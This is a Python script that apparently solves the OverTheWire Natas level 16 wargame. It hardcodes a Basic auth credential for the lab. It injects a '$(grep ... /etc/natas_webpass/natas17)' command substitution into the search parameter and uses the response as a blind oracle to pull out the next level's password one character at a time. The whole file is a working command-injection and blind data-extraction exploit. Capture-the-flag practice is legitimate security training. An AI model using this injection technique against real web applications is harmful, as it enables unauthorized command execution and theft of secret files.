import requests

chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
foundChars= []

useragent = "Mozilla/5.0 (X11; Linux i686; rv:61.0) Gecko/20100101 Firefox/61.0"
auth = "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="

headers = {"User-Agent":useragent, "Authorization":auth}

def findChars():
	for c in chars:
		url = "http://natas16.natas.labs.overthewire.org/?needle=$(grep%20"+c+"%20/etc/natas_webpass/natas17)whacked&submit=Search"
		r = requests.get(url, headers=headers)
		if not "whacked" in r.text:
			foundChars.append(c)
			print("".join(foundChars))

def findFlag():
	flag = []
	j=0	
	while (True):
		flag.append(foundChars[0])
		for c in foundChars:
			flag[j] = c
			url = "http://natas16.natas.labs.overthewire.org/?needle=$(grep%20^"+"".join(flag)+"%20/etc/natas_webpass/natas17)whacked&submit=Search"
			r = requests.get(url, headers=headers)
			if not "whacked" in r.text:
				print("flag: {}".format("".join(flag)))
				j+=1
				break
		if j==31:
			break
	return flag

findChars()

print("flag: {}".format("".join(findFlag())))